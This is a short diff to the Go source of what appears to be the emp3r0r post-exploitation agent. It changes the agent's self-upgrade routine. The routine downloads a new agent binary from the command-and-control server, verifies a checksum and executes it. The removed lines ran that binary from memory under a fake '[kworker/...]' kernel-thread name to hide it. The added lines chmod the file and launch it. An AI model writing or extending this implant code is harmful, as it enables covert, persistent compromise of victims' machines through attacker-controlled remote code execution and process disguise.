@@ -5,10 +5,10 @@ import (
 	"errors"
 	"fmt"
 	"io"
-	"io/ioutil"
 	"log"
 	"net"
 	"os"
+	"os/exec"
 	"os/user"
 	"runtime"
 	"strconv"
@@ -130,21 +130,17 @@ func Upgrade(checksum string) error {
 	tempfile := emp3r0r_data.AgentRoot + "/" + util.RandStr(util.RandInt(5, 15))
 	_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/agent", tempfile)
 	if err != nil {
-		return err
+		return fmt.Errorf("Download agent: %v", err)
 	}
 	download_checksum := tun.SHA256SumFile(tempfile)
 	if checksum != download_checksum {
 		return fmt.Errorf("checksum mismatch: %s expected, got %s", checksum, download_checksum)
 	}
-	elfdata, err := ioutil.ReadFile(tempfile)
+	err = os.Chmod(tempfile, 0755)
 	if err != nil {
-		return fmt.Errorf("Read downloaded agent binary: %v", err)
+		return fmt.Errorf("chmod %s: %v", tempfile, err)
 	}
-
-	procName := fmt.Sprintf("[kworker/%d:0H-kb%s]",
-		util.RandInt(0, 8),
-		util.RandStr(util.RandInt(3, 10)))
-	return RunFromMemory(procName, elfdata)
+	return exec.Command(tempfile, "-replace").Start()
 }
 
 func calculateReverseProxyPort() string {
